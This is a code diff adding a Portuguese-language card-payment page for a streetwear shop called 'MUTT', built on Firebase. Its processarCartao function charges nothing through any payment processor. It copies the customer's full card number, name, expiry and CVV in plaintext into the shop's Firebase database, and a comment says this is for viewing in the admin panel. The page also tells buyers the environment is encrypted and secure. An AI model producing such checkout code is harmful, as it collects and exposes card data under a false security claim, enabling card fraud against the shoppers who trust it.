@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MUTT | PAGAMENTO CARTÃO</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #000; color: #fff; }
+        .mutt-card { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 2.5rem; border-radius: 2px; }
+        .input-mutt { 
+            background: #000; border: 1px solid #1a1a1a; color: white; padding: 14px; 
+            border-radius: 0px; width: 100%; font-size: 11px; font-weight: bold; outline: none;
+            text-transform: uppercase; letter-spacing: 0.1em; transition: 0.3s;
+        }
+        .input-mutt:focus { border-color: #fff; }
+        .loader { border: 2px solid rgba(255,255,255,0.05); border-top: 2px solid #fff; border-radius: 50%; width: 18px; height: 18px; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <main class="container mx-auto px-6 py-12 max-w-lg min-h-screen flex flex-col justify-center">
+        
+        <div id="loading-screen" class="text-center space-y-4">
+            <div class="loader mx-auto"></div>
+            <p class="text-[10px] font-black uppercase tracking-[0.4em] text-zinc-600">Sincronizando Terminal...</p>
+        </div>
+
+        <div id="payment-screen" class="hidden space-y-8">
+            <div class="text-center">
+                <h1 class="text-3xl font-black italic uppercase tracking-tighter text-white">Pagamento Cartão</h1>
+                <p id="order-id-display" class="text-zinc-500 text-[9px] uppercase font-black tracking-[0.2em] mt-3 border border-zinc-900 px-4 py-1 inline-block italic">CARREGANDO...</p>
+            </div>
+
+            <div class="mutt-card space-y-6">
+                <div>
+                    <span class="text-zinc-600 text-[8px] font-black uppercase tracking-[0.3em]">Valor Total</span>
+                    <div id="total-display" class="text-4xl font-black italic tracking-tighter text-white mt-1">R$ 0,00</div>
+                </div>
+
+                <div class="space-y-3">
+                    <input type="text" id="card-number" placeholder="NÚMERO DO CARTÃO" class="input-mutt">
+                    <input type="text" id="card-name" placeholder="NOME IMPRESSO" class="input-mutt">
+                    <div class="grid grid-cols-2 gap-3">
+                        <input type="text" id="card-expiry" placeholder="MM/AA" class="input-mutt">
+                        <input type="text" id="card-cvv" placeholder="CVV" class="input-mutt">
+                    </div>
+                    <select id="installments" class="input-mutt bg-black">
+                        <option value="1">1x SEM JUROS</option>
+                    </select>
+                </div>
+
+                <button onclick="processarCartao()" id="btn-pay" class="w-full bg-white text-black py-5 font-black uppercase text-[11px] tracking-[0.3em] hover:bg-zinc-200 transition-all">Finalizar Pagamento</button>
+                
+                <p class="text-[8px] text-zinc-600 text-center uppercase font-bold">Ambiente Criptografado e Seguro</p>
+            </div>
+        </div>
+
+        <div id="processing-screen" class="hidden text-center space-y-8">
+            <div class="loader mx-auto w-12 h-12"></div>
+            <h2 class="text-2xl font-black italic uppercase text-white tracking-tighter">Validando Dados...</h2>
+            <p class="text-zinc-500 text-[10px] uppercase font-bold tracking-widest">Aguardando resposta da operadora do cartão.</p>
+        </div>
+
+        <div id="success-screen" class="hidden text-center space-y-8">
+            <div class="w-20 h-20 bg-white rounded-full flex items-center justify-center mx-auto shadow-[0_0_30px_rgba(255,255,255,0.2)]">
+                <i class="fa-solid fa-check text-4xl text-black"></i>
+            </div>
+            <h2 class="text-4xl font-black italic uppercase text-white tracking-tighter">Pedido Aprovado</h2>
+            <p class="text-zinc-500 text-[10px] uppercase font-bold tracking-widest">Seu pagamento foi confirmado com sucesso.</p>
+            <button onclick="window.location.href='meus-pedidos.html'" class="w-full bg-white text-black py-6 font-black uppercase text-[11px] tracking-[0.2em]">Ver Meus Pedidos</button>
+        </div>
+
+        <div id="error-screen" class="hidden text-center space-y-8">
+            <div class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center mx-auto shadow-[0_0_30px_rgba(220,38,38,0.4)]">
+                <i class="fa-solid fa-xmark text-4xl text-white"></i>
+            </div>
+            <h2 class="text-4xl font-black italic uppercase text-white tracking-tighter">Cartão Recusado</h2>
+            <p class="text-zinc-500 text-[10px] uppercase font-bold tracking-widest">A operadora negou a transação. Verifique os dados ou saldo.</p>
+            <div class="space-y-3">
+                <button onclick="location.reload()" class="w-full bg-white text-black py-6 font-black uppercase text-[11px] tracking-[0.2em]">Tentar Novamente</button>
+                <button onclick="recuperarCarrinho()" class="w-full border border-zinc-900 text-zinc-500 py-4 font-black uppercase text-[9px] tracking-[0.2em]">Trocar Forma de Pagamento</button>
+            </div>
+        </div>
+
+    </main>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, onValue, query, limitToLast, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDr-W03cp72jHiyALGWlI4vBfxH2xrC-6w",
+            authDomain: "mutt-streetwear.firebaseapp.com",
+            databaseURL: "https://mutt-streetwear-default-rtdb.firebaseio.com",
+            projectId: "mutt-streetwear",
+            storageBucket: "mutt-streetwear.firebasestorage.app",
+            messagingSenderId: "65929911570",
+            appId: "1:65929911570:web:86299846ef5401b5c0a7cb"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const auth = getAuth(app);
+
+        let itensDoPedidoAtual = [];
+        let idPedidoAtual = "";
+        let uidUsuario = "";
+
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                uidUsuario = user.uid;
+                const pedidosRef = query(ref(db, `usuarios/${user.uid}/pedidos`), limitToLast(1));
+                onValue(pedidosRef, (snapshot) => {
+                    const data = snapshot.val();
+                    if (!data) { exibirTela('error-screen'); return; }
+
+                    idPedidoAtual = Object.keys(data)[0];
+                    const pedido = data[idPedidoAtual];
+                    itensDoPedidoAtual = pedido.itens;
+
+                    if (pedido.status === "Aprovado" || pedido.status === "Pago") {
+                        exibirTela('success-screen');
+                    } else if (pedido.status === "Recusado" || pedido.status === "Cancelado") {
+                        exibirTela('error-screen');
+                    } else {
+                        renderizarDados(pedido, idPedidoAtual);
+                    }
+                });
+            } else { window.location.href = 'login.html'; }
+        });
+
+        function renderizarDados(pedido, id) {
+            document.getElementById('total-display').innerText = `R$ ${pedido.total.toFixed(2).replace('.', ',')}`;
+            document.getElementById('order-id-display').innerText = `ORDEM #${id.substring(id.length - 8).toUpperCase()}`;
+            
+            // Aqui vamos carregar as parcelas que virão do seu ADM futuramente
+            // Por enquanto, deixamos o padrão
+            const select = document.getElementById('installments');
+            select.innerHTML = `<option value="1">1x de R$ ${pedido.total.toFixed(2)} SEM JUROS</option>`;
+            
+            exibirTela('payment-screen');
+        }
+
+        window.processarCartao = async () => {
+            const btn = document.getElementById('btn-pay');
+            const dados = {
+                numero: document.getElementById('card-number').value,
+                nome: document.getElementById('card-name').value,
+                exp: document.getElementById('card-expiry').value,
+                cvv: document.getElementById('card-cvv').value,
+                parcelas: document.getElementById('installments').value
+            };
+
+            if(!dados.numero || !dados.cvv) return alert("PREENCHA OS DADOS DO CARTÃO");
+
+            exibirTela('processing-screen');
+
+            // Envia os dados do cartão para o pedido no Firebase (para você ver no ADM)
+            await update(ref(db, `pedidos/${idPedidoAtual}`), { 
+                dadosCartao: { ...dados, statusTransacao: "Em Análise" } 
+            });
+            await update(ref(db, `usuarios/${uidUsuario}/pedidos/${idPedidoAtual}`), { 
+                dadosCartao: { ...dados, statusTransacao: "Em Análise" } 
+            });
+        };
+
+        window.recuperarCarrinho = () => {
+            if (itensDoPedidoAtual) localStorage.setItem('carrinho', JSON.stringify(itensDoPedidoAtual));
+            window.location.href = 'carrinho.html';
+        };
+
+        function exibirTela(id) {
+            ['loading-screen', 'payment-screen', 'processing-screen', 'success-screen', 'error-screen'].forEach(t => {
+                const el = document.getElementById(t);
+                if(el) el.classList.add('hidden');
+            });
+            document.getElementById(id).classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
